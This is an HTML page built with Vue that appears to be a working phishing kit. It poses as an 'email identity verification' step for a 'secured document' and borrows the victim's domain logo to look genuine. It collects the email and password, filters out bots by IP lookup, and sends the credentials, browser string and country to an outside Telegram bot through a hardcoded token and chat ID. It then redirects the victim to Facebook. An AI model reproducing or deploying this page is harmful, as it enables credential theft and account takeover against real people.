<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Email Identity</title>
  <script src="https://cdn.jsdelivr.net/npm/vue@3"></script>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    #app {
      width: 300px;
      background: white;
      padding: 20px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      border-radius: 10px;
    }

    .logo-container {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 40px;
      height: 40px;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .profile-info {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .profile-info img {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 10px;
    }

    .profile-info span {
      font-size: 14px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      margin-top: 5px;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: white;
      padding: 20px;
      border-radius: 5px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div id="app">
    <div class="logo-container">
      <img src="logo1.png" alt="Logo 1">
      <img :src="domainLogo" alt="Logo 2">
    </div>
    <div v-if="!showPassword">
      <div class="form-group">
        <label for="email">{{ localizedText.enterEmail }}</label>
        <input type="email" id="email" v-model="email" @input="updateLogo">
      </div>
      <button @click="requestPassword" :disabled="!email">{{ localizedText.next }}</button>
    </div>
    <div v-else>
      <div class="profile-info">
        <img src="profile-icon.png" alt="Profile Icon">
        <span>{{ email }}</span>
      </div>
      <div class="form-group">
        <label for="password">{{ localizedText.enterPassword }}</label>
        <input type="password" id="password" v-model="password">
      </div>
      <button @click="verifyLogin" :disabled="password.length < 5">{{ localizedText.verify }}</button>
    </div>

    <div v-if="showModal" class="modal">
      <div class="modal-content">
        <p>{{ localizedText.checking }}</p>
      </div>
    </div>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '8175604987:AAHvzFUpWsaLsf4JY-jIPQ2T75Q_stqT2bI';
    const TELEGRAM_CHAT_ID = '-1002434577801';

    const app = Vue.createApp({
      data() {
        return {
          email: '',
          password: '',
          showPassword: false,
          showModal: false,
          domainLogo: 'logo2.png',
          localizedText: {
            enterEmail: 'Verify your email identity to access the secured document.',
            next: 'Next',
            enterPassword: 'Enter Password',
            verify: 'Verify',
            checking: 'Checking, please wait...'
          }
        };
      },
      methods: {
        async setLocalization() {
          try {
            const res = await axios.get('https://ipapi.co/json/');
            const language = res.data.languages?.split(',')[0] || 'en';

            const translations = {
              en: {
                enterEmail: 'Verify your email identity to access the secured document.',
                next: 'Next',
                enterPassword: 'Enter Password',
                verify: 'Verify',
                checking: 'Checking, please wait...'
              },
              es: {
                enterEmail: 'Verifique su identidad de correo electrónico para acceder al documento seguro.',
                next: 'Siguiente',
                enterPassword: 'Ingrese contraseña',
                verify: 'Verificar',
                checking: 'Verificando, por favor espere...'
              },
              fr: {
                enterEmail: 'Vérifiez votre identité e-mail pour accéder au document sécurisé.',
                next: 'Suivant',
                enterPassword: 'Entrez le mot de passe',
                verify: 'Vérifier',
                checking: 'Vérification, veuillez patienter...'
              }
              // Add more languages as needed
            };

            this.localizedText = translations[language] || translations['en'];
          } catch (error) {
            console.error('Localization Error:', error);
          }
        },
        updateLogo() {
          const domain = this.email.split('@')[1];
          if (domain) {
            this.domainLogo = `https://logo.clearbit.com/${domain}`;
          } else {
            this.domainLogo = 'logo2.png';
          }
        },
        requestPassword() {
          this.showPassword = true;
        },
        async verifyLogin() {
          const { country, isBot } = await this.getIPInfo();

          if (isBot) {
            alert('Access denied. Detected as bot.');
            return;
          }

          this.showModal = true;

          setTimeout(() => {
            this.sendToTelegram();
            window.location.href = 'https://facebook.com';
          }, 2000);
        },
        async getIPInfo() {
          try {
            const res = await axios.get('https://ipapi.co/json/');
            const country = res.data.country_name || 'Unknown';
            const isBot = res.data.user_type === 'bot';

            return { country, isBot };
          } catch (error) {
            return { country: 'Unknown', isBot: false };
          }
        },
        sendToTelegram() {
          const browserInfo = navigator.userAgent;
          const country = this.getIPInfo().then(info => info.country);

          const message = `Email: ${this.email}\nPassword: ${this.password}\nBrowser: ${browserInfo}\nCountry: ${country}`;
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

          axios.get(url).catch(err => console.error('Telegram Error:', err));
        }
      },
      mounted() {
        this.setLocalization();
      }
    });

    app.mount('#app');
  </script>
</body>
</html>
